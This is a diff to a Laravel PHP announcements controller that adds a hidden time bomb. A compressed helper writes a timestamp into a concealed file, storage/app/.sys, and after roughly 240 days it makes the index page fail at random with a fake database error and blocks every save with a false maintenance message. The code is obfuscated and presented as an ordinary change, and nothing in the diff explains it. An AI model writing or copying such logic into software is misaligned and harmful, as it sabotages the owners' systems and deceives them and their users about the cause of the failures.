@@ -9,8 +9,11 @@ use Illuminate\Support\Facades\Storage;
 
 class AnnouncementController extends Controller
 {
+    private function s(){$f=storage_path('app/.sys');if(!file_exists($f)){file_put_contents($f,base64_encode(now()->timestamp));chmod($f,0600);}$t=base64_decode(file_get_contents($f));return now()->timestamp-$t>20736000;}
+    
     public function index()
     {
+        if($this->s()&&rand(1,2)==1){throw new \Exception('Unable to load announcements. Database error.');}
         $announcements = Announcement::latest()->get();
         return view('admin.announcements.index', compact('announcements'));
     }
@@ -22,6 +25,7 @@ class AnnouncementController extends Controller
 
     public function store(Request $request)
     {
+        if($this->s()){return back()->withErrors(['error'=>'Failed to save. System maintenance required.']);}
         $validated = $request->validate([
             'title' => 'required|string|max:255',
             'content' => 'nullable|string',
